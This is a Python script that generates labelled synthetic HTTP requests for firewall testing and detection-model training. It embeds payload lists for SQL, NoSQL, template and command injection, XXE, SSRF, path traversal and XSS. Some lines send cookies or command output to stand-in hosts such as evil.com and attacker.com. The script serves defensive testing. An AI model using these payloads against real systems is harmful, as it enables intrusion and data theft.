import csv
import random
import json
import re
import uuid
import datetime
import argparse
from urllib.parse import urlparse
import os
import base64
import time

# Common languages and regions
supported_languages = [
    'en', 'es', 'fr', 'de', 'ja', 'zh', 'ko', 'ru', 'ar', 'hi', 'pt', 'it', 
    'nl', 'pl', 'tr', 'vi', 'th', 'id', 'sv', 'da', 'fi', 'no', 'he', 'el'
]

# Updated international domains with more diversity
international_domains = {
    # Asia - India
    'in': [
        'jio.com', 'flipkart.com', 'irctc.co.in', 'paytm.com', 'zomato.com',
        'hotstar.com', 'myntra.com', 'nic.in', 'sbi.co.in', 'yatra.com',
        'phonepe.com', 'makemytrip.com', 'naukri.com', 'indiamart.com', 'snapdeal.com',
        'icicibank.com', 'hdfcbank.com', 'jiosaavn.com', 'jiomart.com', 'tataneu.com',
        'bharatpe.com', 'zerodha.com', 'swiggy.com', 'aadhaar.gov.in', 'onlinesbi.com'
    ],
    # Asia - China
    'cn': [
        'alibaba.com', 'taobao.com', 'qq.com', 'baidu.com', 'weibo.com',
        'tmall.com', 'jd.com', 'alipay.com', 'sina.com.cn', '163.com',
        'pinduoduo.com', 'bilibili.com', 'xiaomi.com', 'huawei.com', 'tencent.com',
        'douyin.com', 'meituan.com', 'didi.com', 'netease.com', 'zhihu.com',
        'weixin.qq.com', 'youku.com', 'iqiyi.com', 'ctrip.com', 'suning.com'
    ],
    # Asia - Japan
    'jp': [
        'rakuten.co.jp', 'yahoo.co.jp', 'amazon.co.jp', 'softbank.jp', 'docomo.ne.jp',
        'nicovideo.jp', 'goo.ne.jp', 'ameblo.jp', 'line.me', 'dmm.co.jp',
        'mercari.com', 'nintendo.co.jp', 'sony.jp', 'uniqlo.com', 'mizuho.co.jp',
        'au.com', 'seiyu.co.jp', 'lawson.co.jp', 'yodobashi.com', 'bic.jp',
        'cookpad.com', 'pixiv.net', 'kakaku.com', 'ntt.co.jp', 'seven-eleven.co.jp'
    ],
    # Asia - South Korea
    'kr': [
        'naver.com', 'daum.net', 'coupang.com', 'kakao.com', 'samsung.com',
        'gmarket.co.kr', 'auction.co.kr', 'tistory.com', 'nexon.com', 'lg.com',
        'hyundai.com', 'kia.com', 'sktelecom.com', 'kb.co.kr', 'shinhan.com',
        'lotteshopping.com', 'cgv.co.kr', 'hanmail.net', 'yes24.com', 'interpark.com'
    ],
    # Southeast Asia
    'sea': [
        'grab.com', 'lazada.com', 'shopee.com', 'tokopedia.com', 'gojek.com',
        'bukalapak.com', 'traveloka.com', 'blibli.com', 'garena.com', 'zalora.com',
        'carousell.com', 'foodpanda.com', 'astro.com.my', 'kompas.com', 'detik.com',
        'axiata.com', 'singtel.com', 'dbs.com.sg', 'ocbc.com', 'maybank.com'
    ],
    # Europe - Germany
    'de': [
        'otto.de', 'zalando.de', 'deutsche-bank.de', 'sparkasse.de', 'telekom.de',
        'vodafone.de', 'commerzbank.de', 'bmw.de', 'volkswagen.de', 'allianz.de',
        'lufthansa.com', 'siemens.com', 'aldi.de', 'lidl.de', 'mediamarkt.de',
        'dhl.de', 'db.de', 'tchibo.de', 'idealo.de', 'check24.de'
    ],
    # Europe - France
    'fr': [
        'leboncoin.fr', 'orange.fr', 'laposte.fr', 'free.fr', 'sfr.fr',
        'carrefour.fr', 'societe-generale.fr', 'bnpparibas.fr', 'fnac.com', 'sncf.fr',
        'credit-agricole.fr', 'bouygues.fr', 'leclerc.fr', 'cdiscount.com', 'veolia.fr',
        'airfrance.fr', 'peugeot.fr', 'renault.fr', 'michelin.fr', 'decathlon.fr'
    ],
    # Russia and CIS
    'ru': [
        'vk.com', 'yandex.ru', 'mail.ru', 'sberbank.ru', 'avito.ru',
        'wildberries.ru', 'ozon.ru', 'gosuslugi.ru', 'ria.ru', 'rambler.ru',
        'kaspersky.ru', 'alfabank.ru', 'vtb.ru', 'gazprom.ru', 'mts.ru',
        'megafon.ru', 'beeline.ru', 'tinkoff.ru', 'rbc.ru', 'lenta.ru'
    ],
    # Middle East
    'me': [
        'noon.com', 'souq.com', 'dubizzle.com', 'alrajhibank.com.sa', 'etisalat.ae',
        'du.ae', 'stc.com.sa', 'qnb.com', 'emirates.com', 'careem.com',
        'aramco.com', 'dewa.gov.ae', 'adnoc.ae', 'emaar.com', 'almarai.com',
        'talabat.com', 'jarir.com', 'extra.com', 'zain.com', 'ooredoo.com'
    ],
    # Latin America
    'latam': [
        'mercadolibre.com', 'globo.com', 'uol.com.br', 'americanas.com.br', 'rappi.com',
        'bancodobrasil.com.br', 'itau.com.br', 'bradesco.com.br', 'santander.com.br', 'nubank.com.br',
        'falabella.com', 'liverpool.com.mx', 'bancomer.com', 'banamex.com', 'claro.com',
        'telcel.com', 'terra.com', 'copa.com', 'latam.com', 'despegar.com'
    ],
    # Africa
    'af': [
        'jumia.com', 'safaricom.co.ke', 'standardbank.co.za', 'mtn.com', 'fnb.co.za',
        'absa.africa', 'multichoice.com', 'vodacom.co.za', 'takealot.com', 'konga.com',
        'mpesa.com', 'ecocash.co.zw', 'capitecbank.co.za', 'bidorbuy.co.za', 'supersport.com',
        'dstv.com', 'shoprite.co.za', 'glo.com', 'airtel.com', 'ecobank.com'
    ],
    # Global (reduced proportion)
    'global': [
        'google.com', 'facebook.com', 'amazon.com', 'microsoft.com', 'apple.com',
        'netflix.com', 'twitter.com', 'linkedin.com', 'instagram.com', 'github.com',
        'youtube.com', 'whatsapp.com', 'telegram.org', 'zoom.us', 'tiktok.com'
    ]
}

# Update weights for better regional distribution
domain_weights = {
    'in': 15,    # India
    'cn': 15,    # China
    'jp': 12,    # Japan
    'kr': 12,    # South Korea
    'sea': 12,   # Southeast Asia
    'de': 8,     # Germany
    'fr': 8,     # France
    'ru': 10,    # Russia
    'me': 10,    # Middle East
    'latam': 12, # Latin America
    'af': 10,    # Africa
    'global': 8  # Global/US (reduced weight)
}

# Common paths for attacks
api_paths = [
    "/api/login", "/api/users", "/api/products",
    "/api/orders", "/api/payments", "/api/auth",
    "/api/register", "/api/reset-password", "/api/upload",
    "/api/search", "/api/settings", "/api/admin",
    "/api/profile", "/api/checkout", "/api/cart",
    "/api/metrics", "/api/health", "/api/status",
    "/api/debug", "/api/test", "/api/dev",
    "/api/backup", "/api/logs", "/api/config"
]

web_paths = [
    "/login", "/register", "/forgot-password", "/reset-password",
    "/account", "/admin", "/dashboard", "/console",
    "/profile", "/settings", "/upload", "/file-upload",
    "/search", "/checkout", "/contact", "/support",
    "/download", "/product", "/category", "/items",
    "/user", "/cart", "/orders", "/transactions",
    "/backup", "/config", "/.env", "/web.config",
    "/phpinfo.php", "/test.php", "/shell.php", "/cmd.php"
]

admin_paths = [
    "/admin", "/admin/login", "/admin/dashboard",
    "/admin/users", "/admin/settings", "/admin/logs",
    "/administrator", "/admin/products", "/admin/orders",
    "/admin/config", "/admin/system", "/backend",
    "/admin/reports", "/admin/analytics", "/admin/customers",
    "/admin/security", "/admin/roles", "/admin/permissions",
    "/admin/backup", "/admin/import", "/admin/export"
]

# Add after the admin_paths list
modern_attack_patterns = {
    "nosql_injection": [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "sleep(5000)"}',
        '{"$regex": "^admin"}',
        '{"$exists": true}',
        '{"password": {"$regex": ".*"}}',
        '{"$or": [{}, {"a":"a"}]}',
        '{"$gt":"", "$lt":~}',
    ],
    "graphql_attacks": [
        '{"query": "query{__schema{types{name,fields{name}}}}"}',  # Introspection
        '{"query": "query{user(id:1){id,name,email,password}}"}',  # Data exposure
        '{"query": "query @defer{user{id,name}}"}',  # Resource exhaustion
        '{"query": "fragment UserInfo on User{id name} query{user{...UserInfo}}"}',  # Fragment abuse
        '{"query": "query{__type(name:\\"User\\"){name,fields{name,type{name}}}}"}',  # Type enumeration
    ],
    "jwt_attacks": [
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.',  # Algorithm: none
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0',  # Never expire
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9',  # RSA key confusion
    ],
    "prototype_pollution": [
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        '{"__proto__.admin": true}',
        '{"prototype": {"isAdmin": true}}',
    ],
    "template_injection": [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '{7*7}',
        '{{self.__init__.__globals__.__builtins__}}',
        '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
        '${T(java.lang.Runtime).getRuntime().exec(\'id\')}',
    ],
    "xxe_injection": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/self/environ">]><data>&file;</data>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><root/>',
    ],
    "deserialization": [
        'O:8:"stdClass":1:{s:4:"code";s:10:"phpinfo();"}',
        'rO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxlE7sPJSFK5LgDAAJGAApsb2FkRmFjdG9ySQAAc2l6ZXhwP0AAAAAAAAB3CAAAABAAAAAAeA==',
        '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
    ],
    "modern_sqli": [
        'admin\' WAITFOR DELAY \'0:0:5\'--',  # Time-based
        'admin\' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--',  # MySQL sleep
        'admin\' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--',  # JSON function abuse
        'admin\' AND GTID_SUBSET(CONCAT(0x7e,(SELECT VERSION()),0x7e),0)--',  # MySQL GTID abuse
        'admin\' AND EXISTS(SELECT * FROM TABLE_NAME WHERE DBMS_XMLGEN.GETXML(\'select 1 from dual\') IS NOT NULL)--',  # Oracle XML abuse
    ],
    "modern_xss": [
        '<svg/onload=globalThis[`al`+`ert`]`1`>',  # Template literal
        '<x/onclick=globalThis[`ev`+`al`](`al`+`ert`+`(1)`)>',  # Dynamic evaluation
        '<script>fetch(`//evil.com`,{method:`POST`,body:document.cookie})</script>',  # Data exfiltration
        '<img src=x onerror=import(`//evil.com/x.js`)>',  # ES6 module import
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',  # SVG animation
        '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>',  # CSS animation
    ],
    "modern_cmdi": [
        '$(curl${IFS}evil.com/$(whoami))',  # IFS abuse
        '`which${IFS}nc`.${IFS}`which${IFS}wget`',  # Command substitution
        'X=$\'cat\';$X /etc/passwd',  # ANSI-C quoting
        'eval "$(echo Y2F0IC9ldGMvcGFzc3dkCg==|base64 -d)"',  # Base64 encoded
        'python -c \'import os;os.system("id")\'',  # Python one-liner
    ],
    "modern_ssrf": [
        'gopher://127.0.0.1:6379/_SET%20mykey%20%22myvalue%22',  # Redis attack
        'dict://127.0.0.1:11211/stat',  # Memcached attack
        'file:///proc/self/environ',  # File protocol
        'http://[::]:80/',  # IPv6 bypass
        'http://127.1/',  # Alternative localhost
        'http://0/admin',  # Zero IP
        'http://0x7f000001/',  # Hex IP
    ],
    "modern_file_attacks": [
        '../../../etc/passwd%00.png',  # Null byte
        '....//....//....//etc/passwd',  # Multiple dot
        'file:///etc/passwd',  # File protocol
        'php://filter/convert.base64-encode/resource=index.php',  # PHP filter
        'zip://shell.jpg%23payload.php',  # Zip wrapper
        'phar://shell.phar/payload.txt',  # Phar wrapper
    ]
}

def get_modern_attack_payload(attack_type):
    """Get a modern attack payload based on the attack type"""
    if attack_type in modern_attack_patterns:
        return random.choice(modern_attack_patterns[attack_type])
    return None

# Common content types
content_types = {
    "form": "application/x-www-form-urlencoded",
    "json": "application/json",
    "xml": "application/xml",
    "text": "text/plain",
    "html": "text/html",
    "multipart": "multipart/form-data; boundary=---------------------------974767299852498929531610575",
    "pdf": "application/pdf",
    "csv": "text/csv", 
    "excel": "application/vnd.ms-excel",
    "word": "application/msword",
    "zip": "application/zip",

    "binary": "application/octet-stream",
    "javascript": "application/javascript",
    "css": "text/css",
    "yaml": "application/x-yaml",
    "graphql": "application/graphql"
}

# Add after the content_types dictionary
user_agents = {
    "desktop": {
        "chrome": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ],
        "firefox": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
        ],
        "safari": [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
        ],
        "edge": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        ]
    },
    "mobile": {
        "android": [
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        ],
        "ios": [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPod touch; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
        ]
    },
    "bots": {
        "good": [
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)"
        ],
        "malicious": [
            "zgrab/0.x",
            "masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
            "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
        ]
    }
}

def generate_user_agent(is_malicious=False):
    """Generate a realistic user agent string based on modern browsers and devices"""
    if is_malicious and random.random() < 0.3:  # 30% chance for malicious requests to use suspicious user agents
        if random.random() < 0.6:  # 60% chance to use known malicious bot
            return random.choice([
                "zgrab/0.x",
                "masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
                "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
                "sqlmap/1.4.7",
                "Nikto/2.16",
                "Acunetix-WebScanner/1.0",
                "w3af/2.0.0",
                "Morfeus Scanner",
                "OWASP ZAP/2.11.0"
            ])
        else:  # 40% chance to use a highly suspicious or custom user agent
            return random.choice([
                "Python-urllib/2.7",
                "curl/7.64.1",
                "Wget/1.20.3",
                "Custom Scanner v1.0",
                "Vulnerability Scanner",
                "",  # Empty user agent
                "Mozilla/5.0",  # Incomplete user agent
                "HTTP Client",
                "HTTP Request",
                "python-requests/2.25.1",
                "Go-http-client/1.1",
                "Ruby/2.7.0",
                "Java/11.0.12"
            ])
    
    # For benign requests or remaining malicious requests (70%)
    if random.random() < 0.1:  # 10% chance for good bots
        return random.choice([
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)",
            "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
            "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
            "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
        ])
    
    # Determine if mobile or desktop
    is_mobile = random.random() < 0.4  # 40% chance for mobile devices
    
    if is_mobile:
        return random.choice([
            # Android
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            # iOS
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPod touch; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
        ])
    else:
        return random.choice([
            # Chrome
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            # Firefox
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
            # Safari
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            # Edge
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        ])

# Parse command line arguments
parser = argparse.ArgumentParser(description='Generate realistic HTTP request samples for firewall testing and AI model training')
parser.add_argument('--count', type=int, default=1000, help='Number of samples to generate')
parser.add_argument('--output', type=str, default='http_samples.txt', help='Output file for HTTP requests')
parser.add_argument('--output-format', type=str, choices=['txt', 'csv'], default='txt', help='Output format (txt or csv)')
parser.add_argument('--csv_path', type=str, default='Website.csv', help='Path to CSV file with domains')
parser.add_argument('--balance', action='store_true', help='Balance attack types for more even distribution')
parser.add_argument('--analyze', type=str, help='Analyze an existing HTTP sample file and create a detailed report')
parser.add_argument('--debug', action='store_true', help='Enable debug mode for more verbose output')
parser.add_argument('--malicious-ratio', type=float, default=0.4, help='Ratio of malicious requests (default: 0.4)')
parser.add_argument('--convert', type=str, help='Convert an existing text file to CSV format')
args = parser.parse_args()

def analyze_http_samples(file_path):
    """Analyze an existing HTTP sample file and generate statistics"""
    print(f"Analyzing {file_path}...")
    
    # Initialize counters
    total_samples = 0
    attack_types = {}
    http_methods = {}
    content_types = {}
    domains = {}
    
    # Check if file is CSV
    if file_path.endswith('.csv'):
        # Read CSV file
        with open(file_path, 'r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                total_samples += 1
                
                # Extract attack type
                if row['is_attack'] == 'True' and row['attack_type']:
                    attack_types[row['attack_type']] = attack_types.get(row['attack_type'], 0) + 1
                else:
                    attack_types['Benign'] = attack_types.get('Benign', 0) + 1
                
                # Count HTTP methods
                if row['method']:
                    http_methods[row['method']] = http_methods.get(row['method'], 0) + 1
                
                # Count domains
                if row['host']:
                    domains[row['host']] = domains.get(row['host'], 0) + 1
                
                # Count content types
                if row['content_type']:
                    content_types[row['content_type']] = content_types.get(row['content_type'], 0) + 1
    else:
        # Read text file
        with open(file_path, 'r') as f:
            content = f.read()
        
        # Split by the double newline separator
        samples = content.split('\n\n')
        total_samples = len(samples)
        print(f"Found {total_samples} HTTP request samples")
        
        # Initialize counters
        attack_types = {}
        http_methods = {}
        content_types = {}
        domains = {}
        
        # Analyze each sample
        for sample in samples:
            lines = sample.strip().split('\n')
            
            # Extract metadata from the first line (comment)
            if lines and lines[0].startswith('#'):
                metadata = lines[0]
                if 'Attack:' in metadata:
                    attack_type = metadata.split('Attack:')[1].split('-')[0].strip()
                    attack_types[attack_type] = attack_types.get(attack_type, 0) + 1
                elif 'Benign' in metadata:
                    attack_types['Benign'] = attack_types.get('Benign', 0) + 1
            
            # Extract HTTP method
            for line in lines:
                if ' HTTP/' in line and not line.startswith('#'):
                    method = line.split(' ')[0]
                    http_methods[method] = http_methods.get(method, 0) + 1
                    break
            
            # Extract host
            for line in lines:
                if line.startswith('Host:'):
                    host = line.replace('Host:', '').strip()
                    domains[host] = domains.get(host, 0) + 1
                    break
            
            # Extract content type
            for line in lines:
                if line.startswith('Content-Type:'):
                    ctype = line.replace('Content-Type:', '').strip()
                    content_types[ctype] = content_types.get(ctype, 0) + 1
                    break
    
    # Generate report
    report_file = file_path.rsplit('.', 1)[0] + '_analysis.txt'
    with open(report_file, 'w') as f:
        f.write(f"Sample Analysis Report\n")
        f.write(f"====================\n\n")
        f.write(f"Total samples analyzed: {total_samples}\n\n")
        
        # Attack type distribution
        f.write(f"Attack Type Distribution:\n")
        f.write(f"-----------------------\n")
        for attack, count in sorted(attack_types.items(), key=lambda x: x[1], reverse=True):
            percentage = (count / total_samples) * 100
            f.write(f"{attack}: {count} ({percentage:.1f}%)\n")
        
        f.write(f"\nHTTP Method Distribution:\n")
        f.write(f"------------------------\n")
        for method, count in sorted(http_methods.items(), key=lambda x: x[1], reverse=True):
            percentage = (count / total_samples) * 100
            f.write(f"{method}: {count} ({percentage:.1f}%)\n")
        
        f.write(f"\nContent Type Distribution:\n")
        f.write(f"-------------------------\n")
        for ctype, count in sorted(content_types.items(), key=lambda x: x[1], reverse=True):
            percentage = (count / total_samples) * 100
            f.write(f"{ctype}: {count} ({percentage:.1f}%)\n")
        
        f.write(f"\nTop 10 Domains:\n")
        f.write(f"-------------\n")
        top_domains = sorted(domains.items(), key=lambda x: x[1], reverse=True)[:10]
        for domain, count in top_domains:
            percentage = (count / total_samples) * 100
            f.write(f"{domain}: {count} ({percentage:.1f}%)\n")
    
    print(f"Analysis complete. Report saved to {report_file}")

def convert_text_to_csv(input_file):
    """Convert an existing text file of HTTP requests to CSV format"""
    print(f"Converting {input_file} to CSV format...")
    
    # Read the input file
    with open(input_file, 'r') as f:
        content = f.read()
    
    # Split into individual requests (separated by double newline)
    requests = content.split('\n\n')
    requests = [req.strip() for req in requests if req.strip()]
    
    # Generate CSV rows
    csv_rows = []
    fieldnames = ['index', 'is_attack', 'attack_type', 'method', 'url', 'host', 
                 'user_agent', 'accept', 'accept_language', 'accept_encoding', 
                 'content_type', 'content_length', 'connection', 'cookie', 'body',
                 'x_forwarded_for', 'referer', 'origin', 'x_requested_with',
                 'http_version']  # Added http_version field
    
    for i, request in enumerate(requests, 1):
        if request:  # Skip empty requests
            csv_row = parse_request_to_csv_row(request, i)
            csv_rows.append(csv_row)
    
    # Write CSV output
    output_file = input_file.rsplit('.', 1)[0] + '.csv'
    with open(output_file, 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames, quoting=csv.QUOTE_ALL)
        writer.writeheader()
        writer.writerows(csv_rows)
    
    print(f"Converted {len(csv_rows)} requests")
    print(f"CSV output written to {output_file}")

# Read domains from CSV
benign_domains = []
malicious_domains = []

# Attempt to read domains from CSV file
try:
    with open(args.csv_path, 'r') as file:
        reader = csv.DictReader(file)
        for row in reader:
            if row['label'].lower() == 'benign':
                benign_domains.append(row['value'])
            elif row['label'].lower() == 'malicious':
                malicious_domains.append(row['value'])

    if args.debug:
        print(f"DEBUG: Loaded {len(benign_domains)} benign domains")
        print(f"DEBUG: Loaded {len(malicious_domains)} malicious domains")

except FileNotFoundError:
    print(f"CSV file {args.csv_path} not found. Using built-in domain lists.")
    # Fallback domains if CSV isn't found
    benign_domains = [generate_international_domain(False) for _ in range(20)]
    malicious_domains = [generate_international_domain(True) for _ in range(10)]

# Ensure we have enough domains
if len(benign_domains) < 10:
    print("Warning: Not enough benign domains in CSV. Adding fallback domains.")
    benign_domains.extend([generate_international_domain(False) for _ in range(10)])

if len(malicious_domains) < 10:
    print("Warning: Not enough malicious domains in CSV. Adding fallback domains.")
    malicious_domains.extend([generate_international_domain(True) for _ in range(5)])

# Clean up the domains (remove trailing slashes)
benign_domains = [domain.rstrip('/') for domain in benign_domains]
malicious_domains = [domain.rstrip('/') for domain in malicious_domains]

# Common User-Agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15", 
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/113.0 Firefox/113.0",
    "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.167 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
]

# Common HTTP protocol versions with weights
http_versions = [
    ("HTTP/1.0", 5),
    ("HTTP/1.1", 80),
    ("HTTP/2.0", 15)
]

# Add at the top of the file after other imports
def load_attack_patterns_from_csv(filename):
    """Load attack patterns from CSV files"""
    patterns = []
    try:
        with open(filename, 'r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                if all(key in row for key in ['value', 'label', 'description']):
                    patterns.append({
                        "payload": row['value'],
                        "name": row['label'],
                        "description": row['description']
                    })
    except FileNotFoundError:
        print(f"Warning: {filename} not found. Using default patterns.")
        return []
    return patterns

# Load patterns from CSV files
sql_injection_patterns = load_attack_patterns_from_csv('sqli.csv')
path_traversal_patterns = load_attack_patterns_from_csv('path_traversal.csv')
encoding_patterns = load_attack_patterns_from_csv('encoding.csv')
command_injection_patterns = load_attack_patterns_from_csv('command_injection.csv')

# XSS (Cross-Site Scripting) patterns
xss_patterns = [
    {"payload": "<script>alert(document.cookie)</script>", "name": "Basic XSS", "description": "Basic XSS using script tag"},
    {"payload": "<img src=\"x\" onerror=\"alert(document.cookie)\">", "name": "Image XSS", "description": "XSS using image error handler"},
    {"payload": "<svg onload=alert(document.domain)>", "name": "SVG XSS", "description": "XSS using SVG element"},
    {"payload": "<iframe src=\"javascript:alert(`XSS`)\"></iframe>", "name": "Iframe XSS", "description": "XSS using iframe with javascript URI"},
    {"payload": "\"><script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>", "name": "Data Exfiltration", "description": "XSS for stealing cookies"},
    {"payload": "<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>", "name": "Encoded XSS", "description": "XSS using base64 encoded payload"},
    {"payload": "<a href=\"javascript:alert(1)\">Click me</a>", "name": "Link XSS", "description": "XSS using javascript URI in link"},
    {"payload": "javascript:alert(document.cookie)", "name": "Protocol XSS", "description": "XSS using javascript protocol"}
]

